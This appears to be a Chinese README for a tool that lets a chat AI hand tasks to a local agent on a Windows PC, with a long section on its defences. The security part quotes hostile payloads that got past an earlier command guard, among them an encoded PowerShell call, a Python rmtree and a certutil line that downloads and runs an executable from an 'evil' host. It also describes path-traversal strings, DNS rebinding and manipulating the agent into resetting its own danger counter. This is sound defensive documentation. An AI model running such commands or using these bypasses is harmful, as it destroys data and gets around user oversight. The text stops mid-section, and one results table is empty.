# remote-dispatch

**v1.3.2** · [更新日志](CHANGELOG.md) · [接下来往哪走](ROADMAP.md) · [测试说明](TESTS.md) · [踩过的坑](PITFALLS.md) · [任务怎么写](examples/task-templates.md)

让聊天窗口里的 AI，把活派到你的电脑上干，干完带着成果回来。

**这不是一个「聊天机器人框架」。** 它解决的是一个很具体的问题：

> 你在外面，用手机让 AI 帮忙改点东西。但它只在聊天窗口里，
> 没有终端、没有文件系统，什么都动不了。

**派出去，干活，交货。**

```
你在手机上说的话   →   电脑上真的有人去做   →   文档、表格、图片发回来
```

**从 v1.1.0 起，任务端不用装 DeepSeek Harness 了。** 自带引擎，任何 OpenAI 兼容的接口填进去就能跑——OpenAI、DeepSeek、通义、Kimi、本地 Ollama 都行。详见 [任务端](#任务端任何-openai-兼容的接口)。

## 测试

**338 个回归测试 + 137 条暴力攻击载荷，全部通过，约 40 秒。**

```bash
# 全部跑一遍（含暴力测试）
python tests/run_all.py

# 只跑暴力攻击测试
python tests/brute_force.py
```

**为什么要单独列暴力测试：**

因为"功能对不对"和"挡不挡得住"是两回事。

前者证明它**能用**，后者证明它**敢用**。

`tests/brute_force.py` 里那 137 条，都是**真的攻击载荷**——
有人实测打过我们，把穿过去的记下来了；我们自己又打了两轮，
打出来的每一个也都留在里面当回归测试。

**不用信我们的话，clone 下来自己跑一遍。**

**每个测试文件测什么、为什么这么测、测试自己踩过哪些坑——都写在 [TESTS.md](TESTS.md) 里。**

```bash
# 装一次 pytest
python -m pip install pytest

# 全部跑一遍
python tests/run_all.py

# 或者按模块跑
python -m pytest tests/test_safe_path.py -v
```

| 模块 | 数量 | 测什么 |
|---|---|---|
| 路径安全 | 92 | 路径穿越、Unicode 变体、Windows 保留名 |
| 危险操作验证码 | 41 | 三级确认、全站围栏、强制锁、自动解 |
| 接口安全 | 43 | token、浏览器请求、DNS rebinding |
| 引擎核心 | 41 | 工具调用、会话存盘、限流、中文编码 |
| 并发与调度 | 15 | 并发上限、排队、多线程写文件 |
| 产出文件 | 36 | 哪些算成果、超大文件、分类 |
| 动作级守卫 | 50 | 不可逆动作识别、防篡改计数、三次锁死 |
| 实战 bug | 10 | 线上真炸过的，从故障反推回来 |
| 压力测试 | 10 | 万级随机输入、暴力猜码、超大负载 |

**为什么这些测试值得看**

它们不是在测"功能对不对"，是在测**"被攻击时撑不撑得住"**。

比如路径安全那 92 条里，有一大半是**攻击载荷**：

```
../PWNED                    经典穿越
．．PWNED           全角句号
..\u200B/PWNED              零宽字符
CON.txt                     Windows 设备名
[a] * 500                   超长
```

**并发那 15 条里，有一条专门验证"`_write_tasks` 遇到 PermissionError 会重试"** —— 这是 Windows 上真踩过的坑（多个进程同时写同一个 jsonl，`os.replace` 直接崩）。

**验证码那 37 条的核心是这一条：**

```
发了验证码之后，**普通任务也派不出去**。
```

不是只拦那个危险任务——是全局封锁。这条如果漏了，整个安全设计的语义就错了。

**测试自己的两个教训也记着**

**一、测试脚本里 import 的模块，和服务进程里的不是同一份**

`guard` 的状态在内存里。测试脚本 import 一份、服务进程里一份，两边不通。

结果：测试说"没锁"，服务说"锁着"，来回打架。

**修法：** 在服务进程内跑自检（`/api/guard/selftest`），用同一份状态。

**二、测错东西比不测更糟**

有两条测试一开始断言失败，我以为是代码有 bug。

查下来是**测试写错了**：

```
· 中间重置了 tries 计数，导致"错三次"实际只错了两次
· 随机名字生成器里有 15% 本来就该被拒（以 - 开头 / 结尾是点）
```

**测错了会给你一个假的安心，或者让你去修一个不存在的 bug。**

## 它长什么样

**整套东西有四个角色，各住在不同的地方：**

```
┌──────────────────────────────────────────────────────────┐
│                                                          │
│   你（QQ / 飞书）                                          │
│      │                                                   │
│      ▼                                                   │
│   ┌────────────────────┐                                 │
│   │  前台那个 AI         │  她理解你的话，判断要不要派         │
│   │  (AstrBot 插件)      │  危险操作先提醒、警告、发验证码      │
│   └─────────┬──────────┘                                 │
│             │                                            │
│             │  ┌─────────────────────┐                   │
│             ├──┤ 危险操作验证码闸门    │  出码就全站锁        │
│             │  │ 验证通过才放行        │                   │
│             │  └─────────────────────┘                   │
│             │                                            │
│             │  dispatch（0.2 秒返回，不等）                 │
│             ▼                                            │
│   ┌────────────────────┐                                 │
│   │  tasks.jsonl        │  任务清单                        │
│   └─────────┬──────────┘                                 │
│             │  后台进程去跑                                 │
│             ▼                                            │
│   ┌────────────────────┐                                 │
│   │  任务端那个 AI       │  自带引擎，任何 OpenAI 兼容接口     │
│   │  (自带引擎)          │  真去改文件、跑命令                 │
│   └─────────┬──────────┘                                 │
│             │  写出结果 + 完成通知                          │
│             ▼                                            │
│   ┌────────────────────┐                                 │
│   │  outbox.jsonl       │  完成箱（含做出来的文件清单）      │
│   └─────────┬──────────┘                                 │
│             │  插件盯这个文件                               │
│             ▼                                            │
│   主动推给你：文字摘要 + 产出的文件                           │
│  ┌──────────────────┐                                    │
│  │「报告」做完了      │   ← 文字                            │
│  │ 📄 季度报告.docx   │   ← 文件本身                        │
│  └──────────────────┘                                    │
│                                                          │
└──────────────────────────────────────────────────────────┘

    整个过程里，桥的 HTTP 接口只监听 127.0.0.1——
    外面连不进来，本机别的程序没有 token 也调不动。

    反方向也通：你发个文档过去，前台能读里面的内容。
```

**为什么拆成四个角色：**

| 角色 | 为什么单独 |
|---|---|
| **前台** | 在 IM 里，随时能聊，但不该在那边长跑重活 |
| **闸门** | 独立于前台的代码判断，不靠模型自觉 |
| **任务端** | 真干活的地方，可能跑几分钟，不该占着对话等 |
| **outbox** | 完成通知的中转站，用户不在线也不会丢 |

## 两个方向都要通

**派活是往下走，这次把"往下走"和"往上回"都补齐了。**

### 往下：任务产出的文件自动推回来

**以前推送只说一句「XXX 做完了」。**

如果这个活是"做一份报告"，用户还得自己去电脑上翻到那个 docx。**等于通知了，但没交货。**

**现在的做法：任务跑完，扫一遍它的工作目录。**

```
<桥目录>/workspaces/<任务名>/
```

**挑出做出来的东西，跟着推送一起发回去。**

```
[DeepSeek] 「季度报告」做完了（37 秒）：报告写好了

📄 季度报告.docx
📊 数据表.xlsx
🖼 截图.png          ← 图片直接展示，不是文件卡片
```

**哪些算产出、哪些不算：**

| 算 | 不算 |
|---|---|
| docx / xlsx / pptx / pdf / csv / md / 图片 / 压缩包 | `.progress.json`、`.session.json`、日志、缓存 |
| 顶层 + 一层子目录里的 | `node_modules`、`.git`、`__pycache__` |
| 不超过 30MB、一次最多 5 个 | 空文件、超大文件（会在推送里说明原因） |

**只扫两层，不递归**：任务目录里可能有几百个中间文件，全扫一遍会把垃圾当产出，慢而且没意义。

**没发出去的文件会写清楚为什么：**

```
这几个没发过来：
  · 完整备份.zip —— 太大（128MB，超过 30MB）
要的话跟我说，或者去电脑上看。
```

**失败的任务不扫。** 失败的目录里多半是半成品，推回去反而让人困惑"这文件能不能用"。

### 往上：你发的文档，她能读

**倒过来也有个坑。**

用户发个 docx 给前台，她只会说"我这边没收到文件"——因为**她确实没收到内容**，只收到一个路径。

**更隐蔽的一种：** 飞书把「文字 + 文件」打包成 `post`（富文本）类型：

```json
{
  "content": [[{"tag": "text", "text": "能看到吗？"}]],
  "files": [{"file_key": "...", "file_name": "报告.pdf"}]
}
```

**文件在顶层的 `files` 字段里，不在 `content` 段落里。**

而 `content` 的解析逻辑只遍历段落，**完全看不到 `files`**。

于是用户明明发了文件，前台只看到"能看到吗？"这一句话。**文件凭空消失。**

**现在的做法：**

```
收到消息
  → 检查有没有被漏掉的 files
  → 下载下来（直接调飞书 API，不依赖框架内部实现）
  → 按格式解析
  → 把正文拼进上下文
```

**支持读的格式：**

```
docx    段落 + 表格
xlsx    每个工作表的前 200 行
pptx    每页的文字
pdf     前 50 页
txt/md/csv/json/代码文件     直接读（自动试 UTF-8 / GBK）
```

**读完是这样进上下文的：**

```
【读到的文档：季度报告.docx】
第一段…
姓名 | 年龄
张三 | 25
【文档结束】
```

**太长的会截断**（24000 字符），并告诉模型"要更多细节我可以去查"——一份 50 页的文档全塞进上下文会把窗口撑爆，而模型多半只需要知道大概内容。

**依赖：** `python-docx`、`openpyxl`、`python-pptx`、`pypdf`。缺哪个就跳过哪种格式，不会崩。

## 为什么这么设计

### 一、派活必须「不等」

最早写的是同步等结果。**真干活要几分钟，而 QQ 那边等不了那么久。**

结果就是：电脑端明明 194 秒跑完了、成功了，QQ 端 2 分钟就断了，只能说一句"超时"。

**更糟的是分不清"还在跑"和"卡死了"** —— 两个都叫超时。

所以拆成两个动作：
- `dispatch` 写一条就返回，0.2 秒
- 后台进程慢慢跑，跑多久都行

### 二、要有一个「同一个窗口」

每次 `dsh qqme "任务"` 都是新进程。**新进程不知道上次干了什么，等于每次都是第一次见你。**

`headless` 支持 `--session-id <id>`，文档写的是 **adopt**（接手已存在的会话），不是新建。

实测：
```
进程 A：记住暗号「鲸鱼七号」
进程 B（完全新开）：问暗号 → 「鲸鱼七号」
```

**换进程，但窗口是同一个。** 会话号存在 `.session_id`，第一次跑的时候从事件流里抓出来。

### 三、心跳要说清「在做什么」

只报"还在跑"没用 —— 用户看不到它在干什么，跑错了也没法及时收住。

所以心跳（`.progress.json`）里带了 `doing`：从 `--json` 事件流的 `tool_call` 里取最后一个工具调用。

```
正在跑，已 20 秒（心跳 3 秒前）
在做：pwsh: Get-PSDrive C（check disk space）
```

### 四、任务要有「交差规则」

派过一次"查资料"的活，**跑了 28 分钟还没完。**

查事件流才发现：核心结论十分钟就拿到了，后面全在追新冒出来的相关论文（查"压缩摘要"追到 YaRN，从 YaRN 追到 Infini-attention），遇到 429 限流还一遍遍重试。

**每一步都合理，合起来无底洞。** 因为"调研"这类任务没有天然终点：写代码跑通了就是通了；查资料永远能再查一个。

所以派活时会自动附加三条规则（不改任务内容，只加判断标准）：
1. **能回答了就交** —— 手上的东西够了就停，别去找"更全面的资料"
2. **拿不到就记下来、停** —— 重试不超过两次，失败也要报
3. **别扩大范围** —— 查到别的东西记一句就够，别顺着往下查

## 装之前，先看这几条

**这玩意儿只在 Windows 上跑过。** 里面有一半代码是为了绕开 Windows 的坑。

**你需要：**
- [DeepSeek Harness](https://github.com/deepseek-ai/deepseek-harness)（`dsh` 命令能跑）
- 一个能跑 `dsh headless` 的 profile（下面讲怎么配）
- Python 3.10+
- `pywin32`（只有 `watchdog.py` 需要——它用 Windows 的目录变更通知）

**你还需要知道：**
- 它默认给电脑端**全权限**（`danger-full-access`），跟桌面版同一个权限级别
- 所以「能看到它在干什么」和「能随时停掉」不是可选项，是必须的

## 配置

### 1. 准备一个 headless profile

在 `$DSH_HOME/profiles/` 下建一个目录（比如 `qqme`），放一个 `cordis.patch.yml`：

```yaml
# 用官方 API key 通道（按量付费，支持图片）
- id: agent-default-model
  name: "@deepseek-ai/dsh-agent-default-model"
  config:
    provider: deepseek-official
    model: deepseek-flash

# 人格（可选，但强烈建议写——不然它就是个没有性格的执行器）
- id: system-prompt
  config:
    personaPrefix: |
      你是……（写你想要的样子）
```

**为什么用 `deepseek-official` 而不是别的通道：**

- 有每日额度上限的通道，超了任务就哑了，而人在外面时没法充值
- 有些代理通道是纯文本的，会直接拒绝图片（见下面「踩过的坑」）

### 2. 设置环境变量

| 变量 | 作用 | 默认 |
|---|---|---|
| `DEEPSEEK_API_KEY` | 官方 API key | 从 `$DSH_HOME/.credentials.yaml` 读 |
| `DSH_HOME` | DSH 数据目录 | `~/.dsh` |
| `DSH_CMD` | dsh 可执行文件路径 | 从 PATH 找 |
| `DSH_PROFILE_FILE` | qqme 的 patch 文件 | `$DSH_HOME/profiles/qqme/cordis.patch.yml` |

`bridge.py` 会自己从 `$DSH_HOME/.credentials.yaml` 里捞 `DEEPSEEK_API_KEY`，**不用把 key 写进代码。**

## 任务端：任何 OpenAI 兼容的接口

**这是 v1.1.0 最大的变化。** 以前任务端必须跑在 DeepSeek Harness 里，用户想用得先装 DSH——这对很多人是劝退的。

现在自带一个引擎，只要三样东西：

```
接口地址   base_url
API Key   api_key
模型名     model
```

**填在哪：** 桌面端「设置 → 任务端用哪个模型」，填完点「测试连接」，通了再保存。

**模型名不用自己查。** 填好地址和 Key，点「测试连接」，它会去问这个接口**你有哪些模型**，拉回来做成下拉框。

为什么要这样：**服务商的模型名是会变的。** Kimi 把 `moonshot-v1-8k` 下线了，官方文档里还写着它；照文档填就是 `404 Not found the model`，报错还是英文的，用户根本不知道该填什么。**下拉框里的名字是服务商自己给的，不会错。**

**常用的几个：**

| 服务 | 接口地址 | 模型名（示例，以你账号下拉框里的为准） |
|---|---|---|
| OpenAI | `https://api.openai.com` | `gpt-4o` |
| DeepSeek | `https://api.deepseek.com` | `deepseek-chat` |
| 通义千问 | `https://dashscope.aliyuncs.com/compatible-mode` | `qwen-plus` |
| Kimi | `https://api.moonshot.cn` | `kimi-k2.6` |
| 硅基流动 | `https://api.siliconflow.cn/v1` | `deepseek-ai/DeepSeek-V3` |
| 本地 Ollama | `http://localhost:11434` | 你本地有的那个 |

配置存在 `%APPDATA%\dsh-bridge\engine.json`，key 不进代码、不进仓库。

### 可以同时开好几套，各跑各的

**不是「切换」，是「同时都在干活」。**

```
Kimi       最多同时跑 2 个
DeepSeek   最多同时跑 1 个
通义       最多同时跑 1 个
```

每套配置有自己的并发上限，满了排进**这套自己的**队列，等有空位由后台线程自动拉起来——用户派完就关窗口了，不该回来盯队列。

**并发该填多少，取决于你手上的 Key：**

- 免费额度卡得紧的（比如 Kimi 免费版每分钟 3 次请求），填 1~2，多个并行反而互相抢、一起变慢
- 按量付费、没限制的，可以填 3~5
- 填大了不会报错，只是大家一起排队等限流

**这个数字是调速，不是限制。** 窗口想开多少开多少，那是磁盘上的目录。

### 派活时可以指定用哪套

前台（QQ/飞书那边）加了两个工具：

```
list_computer_models    看看现在能用哪些模型
send_to_computer(task, task_name, model="kimi")
```

用户说「派给 Kimi」，前台就能把活送到 Kimi 那套上。名字不用完全对，模糊匹配就行。

### 引擎里有什么

```
engine/llm.py        发请求、解析工具调用、认得出 401/429/500 分别是什么意思
engine/tools.py      六个工具：读文件、写文件、改文件、列目录、搜内容、跑命令
engine/session.py    会话存盘，上下文长了自动压缩
engine/agent.py      工具循环——让模型自己决定调什么、调几次
engine/profiles.py   多套模型配置，各跑各的
engine/scheduler.py  并发上限 + 排队，满了自动轮到下一个
engine/ratelimit.py  按服务商的频率限制排队（每分钟几次那种）
engine/models.py     问接口"你有哪些模型"，给界面做下拉框
```

**只有六个工具，是故意的。** DSH 有几十个，但任务端真正用到的是这几个，工具越多模型越容易挑错。

`edit_file` 单独列出来是因为：让模型「整篇重写」来改一个字符，既慢又容易改坏别的地方。精确替换能让它只动该动的那一行。

### 会话

**一个任务 = 一个工作目录 = 一份记忆。**

```
workspaces/<任务名>/.session.json     ← 完整的对话记录
workspaces/<任务名>/                  ← 它的工作目录
```

**这意味着「继续」是真的继续**，模型记得之前做过什么，不用重新摸一遍。删掉任务目录，记忆跟着没，不会有孤儿数据。

**相对路径以任务目录为准。** 模型说 `write_file("test.txt")`，文件就落在那个任务的目录里，不会跑到别处。

### 上下文长了会自己压缩

超过大约 6 万 token 时，把最早那批消息压成一段摘要——保留用户说过的需求、助手给过的结论，砍掉中间的来回对答。

**不调模型去摘要**，因为那要多花一轮 token、多等一次响应，而且摘要本身也可能丢关键信息。这里做的是保守的"捞要点"，够用且不引入新的不确定性。

### 和 DSH 的关系

**配好了就用新引擎，没配就退回 DSH。**

保留退回这条路是为了不让老用户卡住——他还没填配置时，至少原来能跑的东西还能跑。填好之后 DSH 就完全用不上了。

## 桌面端

一个 Windows 程序，双击打开。不用装 Python，不用开命令行。

```
任务     派活、看进度、看结果
服务     QQ 通道 / 飞书通道 / 任务端，各一个开关
设置     模型配置、程序路径、开机自启
```

**它只认桥的 HTTP 接口，不认 AstrBot。** 以后前台换了框架，这个界面一行不用改——桥是那个稳定的中间层。

### 按需启动：用哪个开哪个

**点一次把 QQ 和飞书一起拉起来，是这一版之前最大的毛病。**

```
QQ 通道    要拉 QQ 客户端（实测 350 MB）+ NapCat
飞书通道    只是网络连接（几十兆），很轻
任务端      跟通道无关，永远通
```

**只用飞书的人，一个 QQ 进程都不会有。** 低配机尤其重要。

实测：

| 操作 | 耗时 | 结果 |
|---|---|---|
| 只开飞书 | 0.2 秒 | QQ 进程 0 个 |
| 只开 QQ | 138 秒（含扫码） | QQ 客户端 350 MB |

两条通道**互斥**：点飞书会自动关掉 QQ 的连接，反之亦然。用户点的语义就是「我只要这个」。

**注意：关 QQ 通道不会杀你的 QQ 客户端。** 那是用户自己的 QQ，乱杀会把他正在用的东西全断掉。通道关了只是 AstrBot 不再跟它通信。

### 怎么做到不停 AstrBot 就切通道

重启一次 AstrBot 要 90 秒，不能每切一次都等这么久。

AstrBot 的 `PlatformManager` 有两个现成方法可以热调：

```python
await pm.terminate_platform("feishu")     # 停掉
await pm.load_platform(config)            # 加载（会看 enable 字段）
```

但插件跑在 AstrBot 进程里，桌面端在外面调不到。所以加了个插件 `astrbot_plugin_dsh_channels`，开一个只监听 `127.0.0.1:6186` 的接口给桌面端用，带 token 校验。

实测切换：**关 0.1 秒，开 0.0 秒。**

### 启动服务：全程零黑窗口

这块比看起来麻烦，踩了几个坑才做对：

| 问题 | 怎么解决的 |
|---|---|
| QQ.exe 是控制台程序，自己会建黑框 | 启动后盯住，见一个藏一个 |
| 对话服务从 exe 启动会再拉两层 Python | 用 `pythonw.exe` 直接跑，压根不创建控制台 |
| 重复点击会起多个实例 | 先查进程和端口，已在跑就直接复用 |

### 扫码登录

QQ 登录态失效时需要扫码。NapCat 会把二维码写到 `cache/qrcode.png`，桌面端读出来直接显示在界面上，带倒计时（剩 30 秒变警告色）。

**过期了会自动重启 QQ 换一张新的**，不用用户自己去找。

点「不管了，停掉」就是真的停掉 QQ，回到干净状态——不是把窗口关掉了事。

### 路径不写死

QQ、NapCat、AstrBot 装在哪儿，第一次打开会自动探测（查注册表 + 常见位置），探测不到让用户点「选择…」自己指，选过就记在 `%APPDATA%\dsh-bridge\config.json`。

**探测结果只填进输入框，要点保存才作数**——万一探测错了，不会把好用的配置覆盖掉。

### 它只做一个程序

接口服务和界面在同一个进程里。任务管理器里出现三个 `python.exe` 会让普通人以为是病毒。

## 服务挂了怎么办（watchdog.py）

**这是这个项目里最容易被忽略、但最要命的一块。**

### 问题

桥跑在 AstrBot 进程里。**AstrBot 一挂，桥跟着挂，然后没人能把它拉起来。**

如果重启这件事交给桥自己干：

```
桥让 AstrBot 重启
  → AstrBot 死
  → 桥跟着死（它在同一棵进程树里）
  → 没人再把它拉起来
```

死锁。**而这个死锁恰好在最要紧的时候发生：你人在外面，改完东西需要重启验证，结果一重启整个系统就没了。**

### 做法

一个**不在 AstrBot 进程树下面**的独立进程。它同时干两件事，这两条是**独立的线**：

**线一：被动听请求**

```
<桥目录>\restart.request      ← 谁要重启，往这里写一行
<桥目录>\restart.result       ← 守护把结果写回来
```

用 Windows 的目录变更通知（`ReadDirectoryChangesW`）监听，**内核推事件，没事件时零开销**。

**线二：主动体检**

**这一条才是"守护"的真正含义。**

第一版只做了线一。当时以为够了，直到有人点破：

> AstrBot 自己崩了、没人写 `restart.request`，它就干看着。

**对。没人请求的时候服务崩了，那才是最需要它的时候。**

所以加了体检：每 30 秒连一次端口，**连续 3 次不通（约 90 秒）才动手**。

为什么要连续 3 次——偶尔一次连不上（正在启动、系统卡顿）不算死。

**为什么体检只能轮询：** 服务死掉这件事不会通知任何人，没有可监听的事件源，只能去问。30 秒一次 TCP 连接尝试，开销可以忽略。

实测（暴力杀掉 AstrBot，不写任何请求文件）：

```
[15:15:18] 杀掉 AstrBot
[15:15:41] 体检：端口不通（第 1/3 次）
[15:16:13] 体检：端口不通（第 2/3 次）
[15:16:45] 体检：端口不通（第 3/3 次）
[15:16:45] 连续探测不到，判定服务已挂，开始拉起
[15:17:14] 自动拉起成功，用时 29.6 秒
```

**全程没人请求。**

### 拉起的时候，两条路

```python
# 路线一：start_astrbot.bat（正常走这条——它可能有环境变量设置）
# 路线二：直接 astrbot.exe run（bat 不可用时的兜底）
```

**为什么要有第二条：** 全指着那个 bat 的话，bat 一改坏、一删，守护就废了——而且是在最需要它的时候。

### 关于"要不要轮询"

合理的组合是：**听请求用事件，查死活用低频轮询。**

- 听请求：可以事件驱动，零开销，就用事件
- 查死活：没有事件源，只能轮询——但 30 秒一次可以忽略

**不是全都轮询，也不是全都事件。** 一开始我两样都想要事件，结果听请求那半确实该用事件，查死活那半根本没法事件。

### 三条自保的规矩（这些不是可选项）

**注意：这三条是 watchdog 自己的约束，跟下面「安全」那节的防护不是一回事。**
放在这里是因为它们解决的是「守护进程别把事搞更大」。

| 规矩 | 为什么必须有 |
|---|---|
| **冷却 5 分钟** | 我自己因为反复重启 AstrBot 被 QQ 踢下线过一次。重启太频繁会触发风控，这条就是挡这个的 |
| **连续失败 3 次就停手** | 免得变成"起了就崩、崩了再起"的死循环，把机器拖死。停手后写 `.stuck` 文件，等人来看 |
| **不碰 NapCat** | NapCat 自己会重连。重启它反而容易触发风控，得不偿失 |

### 用起来

```bash
# 装依赖（pywin32 用于目录监控）
pip install pywin32

# 指定 AstrBot 的启动脚本（或者把 start_astrbot.bat 放到同目录）
set DSH_WATCHDOG_START_BAT=D:\你的AstrBot目录\.bot_runtime\start_astrbot.bat
set DSH_WATCHDOG_PORT=6185

```

```powershell

```

**实测：往目录里写文件，守护进程 CPU 一直是 0，没有任何反应。** 调用卡在里面不返回，参数拼错也不报错。

ctypes 拼 Win32 结构太容易出无声的错，**换成 `pywin32` 的 `win32file` 才正常。**

## 多开：能开到多少，取决于你自己的机器

这个桥支持一任务一会话、一任务一目录、多个任务同时跑。**但上限不是代码决定的，是你机器决定的。**

实测（16 GB 内存 / 16 核，任务内容是"只回一句话"最轻的那种）：

| 并发 | 结果 | 内存峰值 |
|---|---|---|
| 10 | ✅ 10/10 | 正常 |
| 20 | ✅ 20/20，78 秒 | 60% |
| 30 | ✅ 30/30，110 秒 | 75% |
| 50 | ✅ 50/50，201 秒 | 吃紧 |
| 100 | ❌ 内存爬到 91%，只剩 1.4 GB，手动叫停 | — |

**真实任务（改文件、跑命令、读大文件）单个吃得多得多，安全值要往下调。**

实际用起来一次三五件事，连"偶尔高峰"都碰不到。

### 压测挖出来的两个坑

**一、Windows 上 `os.replace` 会失败，POSIX 不会**

多个任务同时更新 `tasks.jsonl` 时：

```
PermissionError: [WinError 5] 拒绝访问
  os.replace('tasks.jsonl.tmp.22112', 'tasks.jsonl')
```

**POSIX 允许原子替换一个正被打开的文件，Windows 直接拒绝。** 十来个任务同时跑就有一半进程崩在启动阶段——状态卡在 pending，其实进程早退了。

这不是理论担心：**三个任务时撞不上，十个一压就现原形。** 而且它在真实使用中会随着任务数增长而变频繁，等你发现时已经很难查了。

**修法不是加锁，是失败重试**（试过加锁，没用——锁只保护自己那段代码，挡不住别人已经打开的文件句柄）。

**二、采样间隔会骗你**

第一版压测脚本每 3 秒采一次内存，报告"50 个并发峰值 61%，很安全"。

手动 2 秒一采才发现：**100 个任务的内存是在 40 秒内从 5.7 GB 爬到 1.4 GB 的**，脚本采样的那一刻恰好都在低点。

**监控粒度比监控本身更重要。** 如果你的采样间隔比问题的发生周期还长，你会得到一个让人放心的假结论。

## 安全

**先说一句要紧的：这个项目不提供「绝对安全」。**

任务端在用户的电脑上、以用户的身份跑。同用户同机器的情况下，
**「谁都突破不了」这种话是不成立的**，任何项目说这句话都是在吹。

能做的是：**把每次伤害的成本抬高，并且让伤害可见。**

下面四层，从外往里。

---

### 第一层：接口不对外

**防的是「外面的人连进来」。**

| 层 | 防什么 | 怎么做的 |
|---|---|---|
| 一 | 从外面连进来 | 绑死 `127.0.0.1`，**没有 `--host` 参数** |
| 二 | 本机别的程序乱调 | 32 字节随机 token，恒定时间比较 |
| 三 | 恶意网页偷调 | 带 `Origin` / `Sec-Fetch-Site` 的一律 403 |
| 四 | DNS rebinding | `Host` 头必须是 `localhost` / `127.0.0.1` |
| 五 | 请求体炸弹 / 畸形请求 | 限 1MB；解析结果必须是对象；字段类型校验 |

**第三层和第四层最容易被忽略。**

浏览器对 `localhost` 的请求**不受同源策略拦截发不出去**——能发，只是读不到响应。
而**派活不需要读响应**。所以一个恶意网页只要知道端口，就能往你的桥里 POST 一个任务。

第四层防的是更隐蔽的一种：攻击者把 `evil.com` 的 DNS 指到 `127.0.0.1`，
用户打开 `evil.com`，请求打到你的服务上，`Host` 头却是 `evil.com`。
这时候浏览器连 `Origin` 都不一定发。

**这一层我们拿自己当攻击者打过 20 轮，找到 5 个真问题**——
包括真实逃出目录的路径穿越、真的能放行所有人的空 token 绕过。
详见 [PITFALLS.md](PITFALLS.md)。

---

### 第二层：任务端默认只有工作区权限

**防的是「派出去的活越界」。**

```
workspace   只能动它自己那个任务目录里的东西（默认）
home        能动你用户目录下的东西（文档、桌面、下载）
full        整个电脑都能动
```

**为什么默认要收：**

任务端有完全权限是必要的——有些活就是要改 `D:\项目\xxx`。
但「默认全开」意味着：**一次成功的诱导 = 整个硬盘**。

「默认最小 + 按需提权」的差别在哪：

```
攻击者要造成伤害，得先让你同意提权。
而提权是个明确动作，你看得见。
```

**权限由用户在桌面端设，或者前台在对话里申请（需要过验证码）。**

检查点放在 `engine/tools.py` 的 `_resolve()` 里——
**所有文件工具都走这条路**，一个地方把关比每个工具各加一遍靠谱。
漏一个就是漏洞。

---

### 第三层：动作守卫

**防的是「活本身做的事不可逆」。**

这一层的来历值得说清楚，因为它**推翻过一个看起来很好的设计**。

#### 第一版：读任务描述，查危险词

```
"删掉整个数据库"  → 命中"删掉整个"  → 拦
```

**失败原因：** 危险的说法列不完（“改个权限”就没在词库里），
而且**任务描述会骗人**——有人让你派活，写个无关紧要的描述就行。

#### 第二版：看工具调用，按「能不能撤销」判断

方向对了。判据也很好——“危险”是个程度问题，“能不能撤销”是非黑即白的。

**但实现是靠词表匹配命令字符串。**

有人拿 14 条载荷实测，**9 条穿过去了**：

```
❌ python -c "import shutil; shutil.rmtree('D:/Project')"
❌ node -e "require('fs').rmSync('D:/Project',{recursive:true})"
❌ powershell -enc <base64>
❌ certutil -urlcache -f http://evil/x.exe x.exe && x.exe
❌ echo. > D:/important.txt
❌ move D:/Project D:/_trash_xyz
```

我复现了，一模一样。

**问题不是词库不全，是这条路本身走不通：**

> 围栏的边界是词表，而词表管不住一个图灵完备的执行入口。

同一个“删掉 D 盘”，可以用 Python 写、Node 写、PowerShell 编码写、
批处理拼接写、下载个 exe 执行。**词表补不完。**

#### 第三版（现在）：管「执行口」，不管「命令长什么样」

**不再问“这条命令危不危险”。问：**

> **这条命令能不能被任意用来干任何事？**

能执行任意代码的入口——`python -c`、`node -e`、`powershell`、
再套一层 `shell`、下载后执行——**必然能做任何不可逆的事**，
包括我们想不到的那些。

**所以这种命令在工作区权限下根本不跑。**

这跟词表的本质区别：

```
词表要枚举「危险行为」  → 无限，永远漏
这层要枚举「执行入口」  → 有限且稳定，就那几类解释器
```

**第二层还留着不可逆动作词表**，挡“直接写着”的破坏（`rm` / `del` /
`git reset --hard` / `chmod` / `format` …）。
两层互补：**先堵任意执行的口子，再挡明写的破坏。**

#### 实测

**156 条攻击载荷，两轮，零真实绕过：**

| 轮次 | 内容 | 结果 |
|---|---|---|

#### 越界写的规则也改过

**原来是「先照做，再提醒」：**

```
"[提醒] 这个文件在任务目录外面：xxx
 已经照做了，但请在结果里告诉用户改了哪个文件。"
```

**但代码实际是跳过执行、根本没写。**

于是模型以为写了，可能跟你说“我改了 xxx”，你去查发现没变。
**谎报比不做更糟**——你会以为自己看到的是最新状态。

**现在是「先拦，如实说」：**

```
[没写] 这个文件在任务目录外面：xxx
当前是工作区权限，只能动任务目录里的东西。
要写它的话，需要给这个窗口提权，或者告诉用户让他自己处理。
```

### 第四层：危险操作的带外验证码

**防的是「拿到你账号的人冒充你下令」。**

#### 为什么「问一句确认」没用

最直觉的方案是：你说「删库」，丫头回「确定吗？」，你回「确定」——然后删了。

**这个流程挡不住任何恶意：**

```
手机掉了 / 账号被盗
→ 那个人能翻聊天记录
→ 能学你的语气
→ 能说一百遍「确认」
→ 丫头照做
```

**暗号也挡不住——暗号就在聊天记录里。**

#### 真正的路子：一条不在对话里的通道

银行不是靠“柜员听你说话判断是不是本人”，而是靠密码 + 手机验证码。

```
第 1 次   提醒      告诉用户"这个活看着不安全"
第 2 次   警告      还剩一次机会
第 3 次   锁死      任务端全停，要走验证码才能解锁
```

**计数的规矩（这条很要紧）：**

```
不按"同一件事"计数 —— 攻击者会不停换花样，每种只试一次永远到不了三次
按当天总次数计数     —— 换什么花样都算一次
验证通过 / 锁满 10 分钟 → 计数重置
```

**换来的是时间成本：** 攻击者要突破，就得反复等 10 分钟、反复拿邮箱验证码。

#### 验证码本身的硬规矩

| 规矩 | 为什么 |
|---|---|
| **码只走邮箱，函数不返回** | 返回给调用方就等于写进了对话上下文，那个码就废了 |
| **一次性** | 验过立刻作废 |
| **绑定具体任务** | 给「删 A 库」发的码，不能拿去「删 B 库」 |
| **恒定时间比较** | `hmac.compare_digest`，防时序侧信道 |
| **120 秒有效** | 用户就在电脑前面，两分钟够翻邮箱 |
| **错三次锁 10 分钟且不许重发** | 再给无限次重发，等于让他十分钟里试 10 万种组合 |

**为什么是邮箱不是短信：** 短信要付钱给运营商，免费的都违法。
邮件免费、独立、同样“不在对话里”。

#### 计数存哪：防任务端篡改

这是最容易得手的一个漏洞——任务端有完全权限，
**骗它派个活“把计数改成 0”就完了。**

做法借鉴单机游戏存档：那种游戏金币数字看得见、搜得到、能改，
但改了没用，重启还会变回去。**靠的不是加密，是几处数据互相印证。**

```
主文件      %APPDATA%\<app>\guard_count.json
影子副本    %LOCALAPPDATA%\<app>\.syscache
